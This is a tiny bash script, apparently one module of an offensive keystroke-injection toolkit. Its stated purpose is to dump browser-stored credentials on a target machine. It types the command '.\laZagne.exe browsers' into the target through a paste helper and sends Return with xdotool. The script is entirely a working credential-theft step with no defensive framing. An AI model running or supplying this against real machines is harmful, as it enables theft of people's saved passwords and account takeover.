#!/bin/bash

: '
Dump browser stored credentials
'

paste_command ".\laZagne.exe browsers"
xdotool key Return
